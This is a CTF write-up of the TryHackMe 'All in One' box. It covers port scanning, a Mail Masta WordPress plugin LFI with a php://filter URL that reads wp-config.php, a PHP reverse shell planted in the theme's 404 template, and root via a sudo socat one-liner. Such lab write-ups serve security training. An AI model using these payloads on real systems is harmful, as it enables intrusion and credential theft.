---
title: "All in One"
date: 2025-01-29
image: /assets/img/tryhackme/Allinone/Allinone_image.jpg
description: Writeup of the TryHackMe-CTF Allinone
categories: [Tryhackme, Easy]
tags: [linux, web, LFI, privesc]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Plattform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>All in One</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>This is a fun box where you will get to exploit the system in several ways. Few intended and unintended paths to getting user and root access.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/r/room/allinonemj">https://tryhackme.com/r/room/allinonemj</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge All in One.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.101.239              
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 12:49 EST
  Nmap scan report for 10.10.101.239
  Host is up (0.041s latency).
  Not shown: 65532 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  21/tcp open  ftp
  22/tcp open  ssh
  80/tcp open  http

  Nmap done: 1 IP address (1 host up) scanned in 18.67 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 21,22,80 10.10.101.239
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 14:06 EST
  Nmap scan report for 10.10.101.239
  Host is up (0.045s latency).

  PORT   STATE SERVICE VERSION
  21/tcp open  ftp     vsftpd 3.0.3
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to ::ffff:10.21.63.26
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 2
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
  |   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
  |_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  |_http-title: Apache2 Ubuntu Default Page: It works
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 8.48 seconds
```
From here I proceeded the analysis port by port.

## Port 21 Analysis
As we can see from the `nmap` output, the `anonymous` login is allowed. Let's analyze that:
```bash
$ ftp anonymous@10.10.101.239
  Connected to 10.10.101.239.
  220 (vsFTPd 3.0.3)
  331 Please specify the password.
  Password: 
  230 Login successful.
  Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
  229 Entering Extended Passive Mode (|||14288|)
  150 Here comes the directory listing.
  drwxr-xr-x    2 0        115          4096 Oct 06  2020 .
  drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
226 Directory send OK.
ftp> send shell.php 
  local: shell.php remote: shell.php
  229 Entering Extended Passive Mode (|||43752|)
  553 Could not create file.
```
Didn't found any file on the ftp server. A search of the `vsFTPd` version didn't reveal any exploit. The ftp server seems to be rabbit hole.

## Port 80 Analysis
The webserver has the `Apache2` default page. Proceeded with a directory enumeration:
```bash
  $ gobuster dir --url http://10.10.101.239/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.101.239/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /wordpress            (Status: 301) [Size: 318] [--> http://10.10.101.239/wordpress/]
  /hackathons           (Status: 200) [Size: 197]
```

### /hackathons Analysis
Reveals a really basic website. The source code reveals potential credentials.
```html
<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
```

### /wordpress Analysis
I checked the website for potential usernames. After that I tried them on the /wp-login endpoint. The username `elyana` seems to be an author so lets brute force it. Didn't got valid credentails. 
I proceeded with `wpscan` and found the following plugin:

```bash
$ wpscan --url http://10.10.101.239/wordpress/
[... reduced for readability ...]
[+] mail-masta
 | Location: http://10.10.101.239/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.101.239/wordpress/wp-content/plugins/mail-masta/readme.txt
[... reduced for readability ...]
$ searchsploit wordpress mail-masta
  -------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
   Exploit Title                                                                                                                                                      |  Path
  -------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  WordPress Plugin Mail Masta 1.0 - Local File Inclusion                                                                                                              | php/webapps/40290.txt
  WordPress Plugin Mail Masta 1.0 - Local File Inclusion (2)                                                                                                          | php/webapps/50226.py
  WordPress Plugin Mail Masta 1.0 - SQL Injection                                                                                                                     | php/webapps/41438.txt
  -------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
This looks really intersting, lets try the Local File Inclusion from the <a href="https://www.exploit-db.com/exploits/40290">exploit-db</a> entry:

![Passwd file](/assets/img/tryhackme/Allinone/thm_allinone_1.jpg)

We can see the user `elyana` again. Let's try to exfiltrate `wordpress` configuration files:
```bash
http://10.10.101.239/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
```
We need a php filter wrapper to prevent php to execute the site. Found more about it on this <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion">OWASP site</a>:
```bash
http://10.10.101.239/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
```
With a `base64` decode we can read the configuration file:
```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', '[removed]' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

With the login we can go to the `Appearance` > `Theme Editor` tab. Here I was able to edit the `404 Tempalte` and replaced the code with a php reverse shell. Now by simply visiting any unknow site, the reverse shell gets activated. Example:
```html
http://10.10.101.239/wordpress/index.php/ThisPageWillNotBeThere
```

## Privilege Escalation elyana
While I was trying to get the user flag I wasn't able to read it due to permissions. But I found the following file:
```bash
$ cat hint.txt
Elyana's user password is hidden in the system. Find it ;)
```
I searched for all files which belong to elyana:

```bash
$ find / -user elyana -type f 2>/dev/null
$ cat /etc/mysql/conf.d/private.txt
  user: elyana
  password: [removed]
  
$ ssh elyana@10.10.101.239
-bash-4.4$ whoami
  elyana
-bash-4.4$ cat user.txt 
  [*** removed ***]
```

## Privilege Escalation root
I started with `sudo -l` and got the following output:
```bash
  Matching Defaults entries for elyana on elyana:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User elyana may run the following commands on elyana:
      (ALL) NOPASSWD: /usr/bin/socat
```
A quick search in <a href="https://gtfobins.github.io/gtfobins/###/">gftobins</a> gave me all I needed:
```bash
-bash-4.4$ sudo socat stdin exec:/bin/sh
  whoami
  root
  cat /root/root.txt
  [*** removed ***]
```

solved! :)
